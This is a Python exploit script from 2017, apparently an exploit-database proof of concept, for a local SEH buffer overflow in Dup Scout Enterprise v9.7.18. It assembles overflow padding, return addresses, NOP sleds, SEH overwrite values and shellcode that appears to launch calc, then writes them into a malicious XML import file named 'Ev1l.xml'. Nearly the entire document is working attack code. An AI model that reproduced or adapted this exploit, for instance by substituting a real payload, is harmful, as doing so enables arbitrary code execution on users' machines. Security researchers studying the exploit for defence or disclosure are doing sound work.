author = '''
  
                ##############################################
                #    Created: ScrR1pTK1dd13                  #
                #    Name: Greg Priest                       #
                #    Mail: ScR1pTK1dd13.slammer@gmail.com    # 
                ##############################################
  
# Exploit Title: Dup Scout Enterprise v9.7.18 Import Local Buffer Overflow Vuln.(SEH)
# Date: 2017.05.24
# Exploit Author: Greg Priest
# Version: Dup Scout Enterprise v9.7.18
# Tested on: Windows7 x64 HUN/ENG Professional
'''


import os
import struct

overflow = "A" * 1536
jmp_esp = "\x94\x21\x1C\x65"
#651F20E5 
#651F214E
#652041ED
nop = "\x90" * 16
esp = "\x8D\x44\x24\x4A"
jmp = "\xFF\xE0"
nop2 = "\x90" * 70
nSEH = "\x90\x90\xEB\x05"
SEH = "\x80\x5F\x1C\x90"
#"\x80\x5F\x1C\x65"
#6508F78D
#650E129F
#651C5F80
shellcode =(
"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f" +
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b" +
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33" +
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b" +
"\x57\x78\x01\xc2\x8b\x7a\x20\x01" +
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6" +
"\x45\x81\x3e\x43\x72\x65\x61\x75" +
"\xf2\x81\x7e\x08\x6f\x63\x65\x73" +
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66" +
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7" +
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9" +
"\xb1\xff\x53\xe2\xfd\x68\x63\x61" +
"\x6c\x63\x89\xe2\x52\x52\x53\x53" +
"\x53\x53\x53\x53\x52\x53\xff\xd7")

crash = overflow+jmp_esp+nop+esp+jmp+nop2+nSEH+SEH+"\x90" * 10+shellcode

evil = '<?xml version="1.0" encoding="UTF-8"?>\n<classify\nname=\'' + crash + '\n</classify>'
exploit = open('Ev1l.xml', 'w')
exploit.write(evil)
exploit.close()

print "Ev1l.xml raedy!"


